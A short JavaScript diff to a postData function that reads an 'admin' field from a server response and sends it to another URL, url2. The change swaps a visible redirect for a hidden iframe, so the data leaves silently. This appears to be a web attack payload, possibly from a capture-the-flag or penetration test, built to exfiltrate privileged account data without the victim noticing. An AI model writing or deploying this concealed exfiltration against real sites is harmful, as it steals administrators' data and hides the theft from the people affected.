@@ -24,7 +24,12 @@ async function postData(url = '', data = {}) {
     console.log('Response:', jsonResponse.admin);
     
    const data2 = JSON.stringify(jsonResponse.admin)
-    location.href = url2 + '=' + data2;
+    //location.href = url2 + '=' + data2;
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    iframe.src = url2 + '=' + data2;
     
   } catch (error) {
     // Handle any errors
